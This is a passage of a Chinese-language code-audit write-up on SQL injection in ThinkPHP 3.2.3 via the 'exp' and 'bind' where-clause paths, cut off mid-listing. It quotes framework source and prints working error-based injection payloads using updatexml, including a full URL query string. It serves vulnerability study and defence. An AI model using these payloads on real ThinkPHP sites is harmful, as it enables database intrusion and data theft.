language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseOrder</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;order&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;order&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseLimit</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;limit&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseUnion</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;union&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;union&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseLock</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;lock&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;lock&#x27;</span>]:<span class="hljs-literal">false</span>),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseComment</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;comment&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;comment&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseForce</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;force&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;force&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>)<br>        ),<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$sql</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这就是用sql模板来构造sql语句，继续跟进到<code>ThinkPHP/Library/Think/Db/Driver.class.php:547</code> 的<code>parseWhereItem</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseWhereItem</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$val</span></span>) </span>&#123;<br>    <span class="hljs-variable">$whereStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$val</span>)) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>])) &#123;<br><span class="hljs-variable">$exp</span>    =  <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(eq|neq|gt|egt|lt|elt)$/&#x27;</span>,<span class="hljs-variable">$exp</span>)) &#123; <span class="hljs-comment">// 比较运算</span><br>                <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$exp</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseValue</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>]);<br>            &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(notlike|like)$/&#x27;</span>,<span class="hljs-variable">$exp</span>))&#123;<span class="hljs-comment">// 模糊查找</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>])) &#123;<br>                    <span class="hljs-variable">$likeLogic</span>  =   <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">2</span>])?<span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">2</span>]):<span class="hljs-string">&#x27;OR&#x27;</span>;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$likeLogic</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;AND&#x27;</span>,<span class="hljs-string">&#x27;OR&#x27;</span>,<span class="hljs-string">&#x27;XOR&#x27;</span>)))&#123;<br>                        <span class="hljs-variable">$like</span>       =   <span class="hljs-keyword">array</span>();<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>)&#123;<br>                            <span class="hljs-variable">$like</span>[] = <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$exp</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseValue</span>(<span class="hljs-variable">$item</span>);<br>                        &#125;<br>                        <span class="hljs-variable">$whereStr</span> .= <span class="hljs-string">&#x27;(&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$likeLogic</span>.<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-variable">$like</span>).<span class="hljs-string">&#x27;)&#x27;</span>;                          <br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$exp</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseValue</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>]);<br>                &#125;<br>            &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;bind&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>                <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; = :&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>            &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;exp&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>                <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>            &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(notin|not in|in)$/&#x27;</span>,<span class="hljs-variable">$exp</span>))&#123; <span class="hljs-comment">// IN 运算</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">2</span>]) &amp;&amp; <span class="hljs-string">&#x27;exp&#x27;</span>==<span class="hljs-variable">$val</span>[<span class="hljs-number">2</span>]) &#123;<br>                    <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$exp</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>])) &#123;<br>                         <span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>] =  <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>]);<br>                    &#125;<br>                    <span class="hljs-variable">$zone</span>      =   <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseValue</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>]));<br>                    <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$exp</span>].<span class="hljs-string">&#x27; (&#x27;</span>.<span class="hljs-variable">$zone</span>.<span class="hljs-string">&#x27;)&#x27;</span>;<br>                &#125;<br>            &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(notbetween|not between|between)$/&#x27;</span>,<span class="hljs-variable">$exp</span>))&#123; <span class="hljs-comment">// BETWEEN运算</span><br>                <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>])? <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>]):<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>                <span class="hljs-variable">$whereStr</span> .=  <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$exp</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseValue</span>(<span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&#x27; AND &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseValue</span>(<span class="hljs-variable">$data</span>[<span class="hljs-number">1</span>]);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-title function_ invoke__">E</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;_EXPRESS_ERROR_&#x27;</span>).<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$count</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$val</span>);<br>            <span class="hljs-variable">$rule</span>  = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$val</span>[<span class="hljs-variable">$count</span>-<span class="hljs-number">1</span>]) ? (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$val</span>[<span class="hljs-variable">$count</span>-<span class="hljs-number">1</span>]) ? <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$val</span>[<span class="hljs-variable">$count</span>-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) : <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$val</span>[<span class="hljs-variable">$count</span>-<span class="hljs-number">1</span>]) ) : <span class="hljs-string">&#x27;&#x27;</span> ; <br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;AND&#x27;</span>,<span class="hljs-string">&#x27;OR&#x27;</span>,<span class="hljs-string">&#x27;XOR&#x27;</span>))) &#123;<br>                <span class="hljs-variable">$count</span>  = <span class="hljs-variable">$count</span> -<span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$rule</span>   = <span class="hljs-string">&#x27;AND&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$count</span>;<span class="hljs-variable">$i</span>++) &#123;<br>                <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$val</span>[<span class="hljs-variable">$i</span>])?<span class="hljs-variable">$val</span>[<span class="hljs-variable">$i</span>][<span class="hljs-number">1</span>]:<span class="hljs-variable">$val</span>[<span class="hljs-variable">$i</span>];<br>                <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;exp&#x27;</span>==<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$val</span>[<span class="hljs-variable">$i</span>][<span class="hljs-number">0</span>])) &#123;<br>                    <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$data</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$rule</span>.<span class="hljs-string">&#x27; &#x27;</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseWhereItem</span>(<span class="hljs-variable">$key</span>,<span class="hljs-variable">$val</span>[<span class="hljs-variable">$i</span>]).<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$rule</span>.<span class="hljs-string">&#x27; &#x27;</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-variable">$whereStr</span> = <span class="hljs-string">&#x27;( &#x27;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$whereStr</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>).<span class="hljs-string">&#x27; )&#x27;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//对字符串类型字段采用模糊匹配</span><br>        <span class="hljs-variable">$likeFields</span>   =   <span class="hljs-variable language_">$this</span>-&gt;config[<span class="hljs-string">&#x27;db_like_fields&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$likeFields</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(&#x27;</span>.<span class="hljs-variable">$likeFields</span>.<span class="hljs-string">&#x27;)$/i&#x27;</span>,<span class="hljs-variable">$key</span>)) &#123;<br>            <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; LIKE &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseValue</span>(<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$val</span>.<span class="hljs-string">&#x27;%&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; = &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseValue</span>(<span class="hljs-variable">$val</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$whereStr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>重点就在这个方法</p><p>当传入的值是数组且第一个键值为<code>exp</code>的时候会拼接<code>where</code>语句</p><p><img src="/mdimg/thinkphp23/1745137915852-18803d3f-a2c5-46c2-b674-f2c7273e9892.png">查看返回值</p><p><img src="/mdimg/thinkphp23/1745137929209-9188c002-567f-4a00-bcd1-f092841722b7.png">继续跟进到最后根据模板生成的sql语句是怎样的</p><p><img src="/mdimg/thinkphp23/1745137272744-a728be7a-1237-4f2d-b23d-86aa90b45b8b.png"></p><p>报错注入构造成功</p><p><img src="/mdimg/thinkphp23/1745137304800-c756f0a9-1708-4ed8-b4b5-7131c51951b0.png"></p><p>这里构造的语句最后就会提交给sql查询</p><p><img src="/mdimg/thinkphp23/1745137307268-f47e8703-5a57-4bfc-87d3-0ab7efb74f7b.png"></p><p>具体是怎么构造，分析<code>parsetSql</code>方法的模板可知</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">%WHERE%   <span class="hljs-comment">//用parseWhere的返回值whereStr 作为where的条件</span><br><span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];    <span class="hljs-comment">// id.&#x27; &#x27;.=1 and updatexml(1,concat(0x7e,user(),0x7e),1)   关键就是id后面拼接空格然后拼接val，val里面加个=就可以注入语句</span><br>最后得到（模板其他的占位符返回的都是空值）<br>SELECT * FROM `user` WHERE `id` =<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-title function_ invoke__">user</span>(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) LIMIT <span class="hljs-number">1</span>  <span class="hljs-comment">//`id` =1 and updatexml(1,concat(0x7e,user(),0x7e),1)就是我们注入的</span><br></code></pre></td></tr></table></figure><p>这里只能通过<code>get</code>或者<code>post</code>等方法传入值，不能通过<code>I()</code>接收值</p><p>因为<code>I</code>方法最后经过了一个回调函数<code>think_filter</code>过滤了<code>exp</code>，在后面添加一个<code>空格</code>，无法进入拼接<code>where</code>的<code>if</code>因为(exp != exp空格)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">think_filter</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span></span>)</span>&#123;<br>    <span class="hljs-comment">// TODO 其他安全过滤</span><br><br>    <span class="hljs-comment">// 过滤查询特殊字符</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="hljs-variable">$value</span>))&#123;<br>        <span class="hljs-variable">$value</span> .= <span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="thinkphp-3-2-3-bind注入"><a href="#thinkphp-3-2-3-bind注入" class="headerlink" title="thinkphp 3.2.3 bind注入"></a><strong>thinkphp 3.2.3 bind注入</strong></h3><h4 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a><strong>配置</strong></h4><p>控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Home</span>\<span class="hljs-title class_">Controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><span class="hljs-comment">//        $this-&gt;show(&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; body&#123; background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.8em; font-size: 36px &#125; a,a:hover&#123;color:blue;&#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V&#123;$Think.version&#125;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&#x27;, &#x27;utf-8&#x27;);</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br>        <span class="hljs-variable">$User</span> = <span class="hljs-title function_ invoke__">M</span>(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">I</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<br>        <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-title function_ invoke__">I</span>(<span class="hljs-string">&#x27;password&#x27;</span>);<br>        <span class="hljs-variable">$valu</span> = <span class="hljs-variable">$User</span>-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-variable">$user</span>)-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$valu</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="审计-2"><a href="#审计-2" class="headerlink" title="审计"></a><strong>审计</strong></h4><p>payload</p><p><code>?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1</code></p><p>注意到上面<code>exp</code>注入的上一个if</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;bind&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>                <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; = :&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><p>当数组第一个键值为<code>bind</code>的时候，会拼接<code>where</code>为</p><p><code>where xxx.&#39; =&#39;.val //也就是拼接一个等号和冒号</code></p><p>这里为什么可以通过<code>I(&#39;id&#39;)</code>获取参数，因为<code>think_filter</code>没有过滤<code>bind</code></p><p>因为用到<code>save()</code>，所以在<code>ThinkPHP/Library/Think/Model.class.php:396</code> 对 <code>save()</code>方法下给断点</p><p>到<code>ThinkPHP/Library/Think/Model.class.php:451</code></p><p><code>$result = $this-&gt;db-&gt;update($data,$options);</code></p><p>调用了<code>update()</code>,跟进<code>ThinkPHP/Library/Think/Db/Driver.class.php:891</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$options</span></span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;model  =   <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;model&#x27;</span>];<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseBind</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;bind&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;bind&#x27;</span>]:<span class="hljs-keyword">array</span>());<br>    <span class="hljs-variable">$table</span>  =   <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseTable</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span>   = <span class="hljs-string">&#x27;UPDATE &#x27;</span> . <span class="hljs-variable">$table</span> . <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseSet</span>(<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$table</span>,<span class="hljs-string">&#x27;,&#x27;</span>))&#123;<span class="hljs-comment">// 多表更新支持JOIN操作</span><br>        <span class="hljs-variable">$sql</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseJoin</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;join&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;join&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$sql</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseWhere</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$table</span>,<span class="hljs-string">&#x27;,&#x27;</span>))&#123;<br>        <span class="hljs-comment">//  单表更新支持order和lmit</span><br>        <span class="hljs-variable">$sql</span>   .=  <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseOrder</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;order&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;order&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>)<br>            .<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseLimit</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;limit&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]:<span 